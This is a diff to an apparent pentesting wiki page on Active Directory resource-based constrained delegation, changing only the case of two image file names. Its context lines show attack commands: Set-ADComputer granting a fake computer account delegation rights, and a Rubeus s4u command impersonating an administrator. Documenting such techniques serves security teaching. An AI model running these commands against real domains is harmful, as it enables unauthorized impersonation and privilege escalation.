@@ -79,7 +79,7 @@ Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKECOMPUTE
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
 
-![](../../.gitbook/assets/B2.png)
+![](../../.gitbook/assets/b2.png)
 
 **Using powerview**
 
@@ -123,7 +123,7 @@ rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:admin
 Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
 {% endhint %}
 
-![](../../.gitbook/assets/B3.png)
+![](../../.gitbook/assets/b3.png)
 
 #### Accessing
 
